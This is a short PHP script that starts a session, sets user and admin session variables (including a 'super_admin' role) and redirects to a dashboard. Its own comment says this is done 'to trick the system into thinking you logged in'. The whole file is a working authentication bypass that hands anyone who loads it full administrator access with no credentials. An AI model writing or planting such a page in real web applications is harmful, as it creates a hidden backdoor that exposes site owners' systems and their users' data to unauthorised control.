<?php
session_start();
// Set the necessary session variables to trick the system into thinking you logged in
$_SESSION['user_id'] = 999;
$_SESSION['user_type'] = 'admin';
$_SESSION['user_name'] = 'Admin User';

// Set admin specific variables (for robustness)
$_SESSION['admin_id'] = 999;
$_SESSION['admin_name'] = 'Admin User';
$_SESSION['admin_role'] = 'super_admin';

// Redirect to the dashboard
header('Location: dashboard.php');
exit();
?>